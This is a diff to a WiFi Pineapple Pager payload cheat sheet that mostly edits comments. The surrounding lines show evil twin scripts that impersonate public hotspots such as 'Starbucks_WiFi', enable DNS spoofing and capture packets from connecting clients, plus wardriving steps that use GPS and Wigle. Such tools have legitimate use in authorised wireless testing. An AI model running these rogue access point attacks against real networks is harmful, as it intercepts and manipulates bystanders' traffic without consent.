@@ -332,7 +332,7 @@ TOS_ACCEPT --i-accept
 # Show alert
 ALERT "Starting Evil Twin Attack"
 
-# Add target SSID to pool
+# Add target SSIDs (or PINEAPPLE_SSID_POOL_ADD_FILE /path/to/ssids.txt)
 PINEAPPLE_SSID_POOL_ADD "FreeWiFi"
 PINEAPPLE_SSID_POOL_ADD "Starbucks_WiFi"
 
@@ -349,7 +349,7 @@ DNSSPOOF_ENABLE
 # Start packet capture
 WIFI_PCAP_START
 
-ALERT "Client connected!"  # Obeys system ringtone preferences
+ALERT "Client connected!"
 ```
 
 </details>
@@ -384,7 +384,7 @@ ALERT "VPN Connection Established"
 # Author: TheCyberJest0r
 # Repository: https://github.com/TheCyberJest0r/Wifi-Pineapple-Pager-Payloads-Cheat-sheet
 
-# Configure GPS
+# Configure GPS (1.0.6+: check Settings > GPS for device path)
 GPS_CONFIGURE /dev/ttyUSB0 9600
 
 # Login to Wigle
@@ -1774,7 +1774,7 @@ ALERT "Collecting SSIDs from probe requests..."
 sleep 30
 PINEAPPLE_SSID_POOL_COLLECT_STOP
 
-# Add target SSIDs
+# Add target SSIDs (or PINEAPPLE_SSID_POOL_ADD_FILE /root/ssids.txt)
 PINEAPPLE_SSID_POOL_ADD "FreeWiFi"
 PINEAPPLE_SSID_POOL_ADD "Starbucks_WiFi"
 PINEAPPLE_SSID_POOL_ADD "attwifi"
@@ -1799,11 +1799,12 @@ ALERT "Waiting for client connection..."
 FIND_CLIENT_IP "aa:bb:cc:dd:ee:ff" 60
 
 # Notify
-ALERT "Client connected!"  # Obeys system ringtone preferences
+ALERT "Client connected!"
 LED red solid
 LOG "Client connected to evil twin"
 
-# Continue monitoring...
+# When done, archive loot (1.0.7+)
+# PINEAPPLE_LOOT_ARCHIVE
 ```
 
 ### 🌐 VPN Setup Workflow
@@ -1835,7 +1836,7 @@ ALERT "VPN Connected"
 # Author: TheCyberJest0r
 # Repository: https://github.com/TheCyberJest0r/Wifi-Pineapple-Pager-Payloads-Cheat-sheet
 
-# Configure GPS
+# Configure GPS (1.0.6+: check Settings > GPS for device path)
 GPS_CONFIGURE /dev/ttyUSB0 9600
 
 # Get current location
